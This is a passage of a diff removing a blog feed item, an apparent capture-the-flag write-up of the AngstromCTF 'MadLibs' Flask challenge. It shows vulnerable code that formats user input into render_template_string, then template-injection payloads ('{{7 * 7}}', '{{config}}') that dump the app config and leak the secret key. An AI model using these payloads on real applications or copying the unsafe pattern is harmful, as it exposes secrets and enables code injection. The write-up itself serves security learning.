-    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;story_fields&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])):&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]:&lt;/span&gt;
-            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;All form fields must be filled&quot;&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;inpValues&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)][:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-
-    &lt;span class=&quot;n&quot;&gt;authorName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inpValues&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''This MadLib with title &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s was created by &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s at &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'''&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authorName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strftime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Y-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;m-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;M:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gmtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())))&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;except&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Error generating comment.&quot;&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;_&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;.html&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libtitle&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;footer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libentries&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inpValues&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-
-&lt;span class=&quot;nd&quot;&gt;@app.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/get-source&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_from_directory&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'app.py'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__main__&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'0.0.0.0'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7777&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threaded&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;We can see the whole logic of written application, but is there something we can exploit? Let’s focus on the user input, and specifically &lt;code class=&quot;highlighter-rouge&quot;&gt;authorName&lt;/code&gt; variable that is used to store our name and print it inthe comment.&lt;/p&gt;
-
-&lt;p&gt;Firstly, we can see that it’s being limited to only 12 characters, which we can easiliy check.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;authorName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inpValues&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;With author name &lt;code class=&quot;highlighter-rouge&quot;&gt;123456789abcd&lt;/code&gt;, which is 13 characters, only first 12 &lt;code class=&quot;highlighter-rouge&quot;&gt;123456789abc&lt;/code&gt; will be printed. That’s the first obstacle we have to keep in mind.&lt;/p&gt;
-
-&lt;p&gt;After that we’re getting to creating the comment with this line of code.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;comment&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'''This MadLib with title &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s was created by &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s at &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s'''&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;templatename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;authorName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strftime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Y-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;m-&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;H:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;M:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;S&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gmtime&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Firstly, we have to think about &lt;code class=&quot;highlighter-rouge&quot;&gt;render_template_string()&lt;/code&gt; function. Quick google will tell us, that it’s used in order to work with templates, that will look just like in this &lt;a href=&quot;http://flask.pocoo.org/docs/0.12/tutorial/templates/&quot;&gt;example&lt;/a&gt;. Further analysis of this code doesn’t provide us with any new, or more useful information so let’s stick to what we have already.&lt;/p&gt;
-
-&lt;p&gt;Part of the job of every person is IT is to learn how to google efficiently in order to look for information. That’s what I did this time, googled &lt;code class=&quot;highlighter-rouge&quot;&gt;flask template vulnerability&lt;/code&gt; and look what we have in &lt;a href=&quot;https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html&quot;&gt;this&lt;/a&gt; link, which showed as the first one in this search engine.&lt;/p&gt;
-
-&lt;p&gt;In addition we get very interesting &lt;a href=&quot;https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf&quot;&gt;whitepaper&lt;/a&gt;, I advice everyone to read it. But back to the challenge. In quick words, we’re able to inject Python code into the template, which will be then executed. Simple test works by putting the input &lt;code class=&quot;highlighter-rouge&quot;&gt;{{7 * 7}}&lt;/code&gt; in our author name input.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; This MadLib with title The Tale of a Person was created by 49 at 2018-03-21 20:08:58&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, it works! But how do we get the secret that is stored at &lt;code class=&quot;highlighter-rouge&quot;&gt;app.secret_key = open(&quot;flag.txt&quot;).read()&lt;/code&gt; variable. As it’s name is to long in order to work correctly, we’ll have to find a workaround. Luckily, there’s a &lt;a href=&quot;&quot;&gt;config&lt;/a&gt; that stores the configuration of our application. Let’s take a look at it  with &lt;code class=&quot;highlighter-rouge&quot;&gt;{{config}}&lt;/code&gt;. And ladies and gentlemen, here we have the config.&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;This MadLib with title The Tale of a Person was created by &amp;amp;lt;Config {&amp;amp;#39;DEBUG&amp;amp;#39;: False, &amp;amp;#39;TESTING&amp;amp;#39;: False, &amp;amp;#39;PROPAGATE_EXCEPTIONS&amp;amp;#39;: None, &amp;amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;amp;#39;: None, &amp;amp;#39;SECRET_KEY&amp;amp;#39;: &amp;amp;#39;actf{wow_ur_a_jinja_ninja}&amp;amp;#39;, &amp;amp;#39;PERMANENT_SESSION_LIFETIME&amp;amp;#39;: datetime.timedelta(31), &amp;amp;#39;USE_X_SENDFILE&amp;amp;#39;: False, &amp;amp;#39;LOGGER_NAME&amp;amp;#39;: &amp;amp;#39;__main__&amp;amp;#39;, &amp;amp;#39;LOGGER_HANDLER_POLICY&amp;amp;#39;: &amp;amp;#39;always&amp;amp;#39;, &amp;amp;#39;SERVER_NAME&amp;amp;#39;: None, &amp;amp;#39;APPLICATION_ROOT&amp;amp;#39;: None, &amp;amp;#39;SESSION_COOKIE_NAME&amp;amp;#39;: &amp;amp;#39;session&amp;amp;#39;, &amp;amp;#39;SESSION_COOKIE_DOMAIN&amp;amp;#39;: None, &amp;amp;#39;SESSION_COOKIE_PATH&amp;amp;#39;: None, &amp;amp;#39;SESSION_COOKIE_HTTPONLY&amp;amp;#39;: True, &amp;amp;#39;SESSION_COOKIE_SECURE&amp;amp;#39;: False, &amp;amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;amp;#39;: True, &amp;amp;#39;MAX_CONTENT_LENGTH&amp;amp;#39;: None, &amp;amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;amp;#39;: datetime.timedelta(0, 43200), &amp;amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;amp;#39;: False, &amp;amp;#39;TRAP_HTTP_EXCEPTIONS&amp;amp;#39;: False, &amp;amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;amp;#39;: False, &amp;amp;#39;PREFERRED_URL_SCHEME&amp;amp;#39;: &amp;amp;#39;http&amp;amp;#39;, &amp;amp;#39;JSON_AS_ASCII&amp;amp;#39;: True, &amp;amp;#39;JSON_SORT_KEYS&amp;amp;#39;: True, &amp;amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;amp;#39;: True, &amp;amp;#39;JSONIFY_MIMETYPE&amp;amp;#39;: &amp;amp;#39;application/json&amp;amp;#39;, &amp;amp;#39;TEMPLATES_AUTO_RELOAD&amp;amp;#39;: None}&amp;amp;gt; at 2018-03-21 20:25:01&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Spot the flag and here you go.&lt;/p&gt;
-</description>
-        <pubDate>Fri, 23 Mar 2018 03:00:00 +0100</pubDate>
-        <link>http://localhost:4000/angstromctf-madlibs/</link>
-        <guid isPermaLink="true">http://localhost:4000/angstromctf-madlibs/</guid>
       </item>
     
   </channel>
